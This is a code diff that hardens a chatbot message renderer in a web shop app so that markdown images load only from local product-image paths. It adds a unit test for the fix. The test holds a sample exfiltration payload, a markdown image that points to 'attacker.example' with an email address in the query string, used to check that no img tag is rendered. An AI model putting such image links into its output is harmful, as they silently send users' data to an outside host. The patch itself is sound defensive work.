@@ -1,0 +1,54 @@
+--- a/src/WebApp/Components/Chatbot/MessageProcessor.cs
++++ b/src/WebApp/Components/Chatbot/MessageProcessor.cs
+@@ -21,7 +21,14 @@
+         {
+             var contentToHere = message.Substring(prevEnd, match.Index - prevEnd);
+             result.Append(HtmlEncoder.Default.Encode(contentToHere));
+-            result.Append($"<img title=\"{(HtmlEncoder.Default.Encode(match.Groups[1].Value))}\" src=\"{(HtmlEncoder.Default.Encode(match.Groups[2].Value))}\" />");
++            if (IsProductImageUrl().IsMatch(match.Groups[2].Value))
++            {
++                result.Append($"<img title=\"{(HtmlEncoder.Default.Encode(match.Groups[1].Value))}\" src=\"{(HtmlEncoder.Default.Encode(match.Groups[2].Value))}\" />");
++            }
++            else
++            {
++                result.Append(HtmlEncoder.Default.Encode(match.Value));
++            }
+
+             prevEnd = match.Index + match.Length;
+         }
+@@ -32,4 +39,7 @@
+
+     [GeneratedRegex(@"\!?\[([^\]]+)\]\s*\(([^\)]+)\)")]
+     private static partial Regex FindMarkdownImages();
++
++    [GeneratedRegex(@"^/?product-images/\d+(\?api-version=\d+(\.\d+)*)?$")]
++    private static partial Regex IsProductImageUrl();
+ }
+--- a/tests/Application.UnitTests/Application.UnitTests.csproj
++++ b/tests/Application.UnitTests/Application.UnitTests.csproj
+@@ -25,6 +25,7 @@
+     <ProjectReference Include="..\..\src\PaymentProcessor\PaymentProcessor.csproj" />
+     <ProjectReference Include="..\..\src\WebhookClient\WebhookClient.csproj" />
+     <ProjectReference Include="..\..\src\Webhooks.API\Webhooks.API.csproj" />
++    <ProjectReference Include="..\..\src\WebApp\WebApp.csproj" />
+   </ItemGroup>
+
+ </Project>
+--- /dev/null
++++ b/tests/Application.UnitTests/MessageProcessorTests.cs
+@@ -0,0 +1,15 @@
++using eShop.WebApp.Chatbot;
++
++namespace eShop.Application.UnitTests;
++
++[TestClass]
++public class MessageProcessorTests
++{
++    [TestMethod]
++    public void AllowImagesDoesNotRenderExternalImageUrls()
++    {
++        var html = MessageProcessor.AllowImages("![x](https://attacker.example/?d=jane@example.com)").Value;
++
++        Assert.IsFalse(html.Contains("<img", StringComparison.Ordinal));
++    }
++}
